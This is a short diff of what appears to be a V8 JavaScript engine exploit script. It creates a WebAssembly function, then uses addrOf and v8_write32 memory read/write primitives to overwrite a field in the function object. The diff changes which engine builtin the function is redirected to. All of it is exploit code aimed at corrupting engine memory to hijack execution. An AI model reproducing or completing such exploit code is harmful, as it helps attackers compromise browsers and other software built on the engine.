@@ -58,7 +58,6 @@ builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ /
 let instance = builder.instantiate();
 
 instance.exports.func1(0n);
-// eval("")
 
 %DebugPrint(instance.exports.func1);
 // ===============================
@@ -69,9 +68,7 @@ console.log("0x" + id_builtins_function.toString(16));
 
 // 0xfc - Builtins_MathLog
 //  Command failed with offset 0x4f
-// 0x336: Builtins_FulfillPromise
-// 0x14a6
-v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x12d4)*0x200);
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x336*0x200);
 console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
 
 
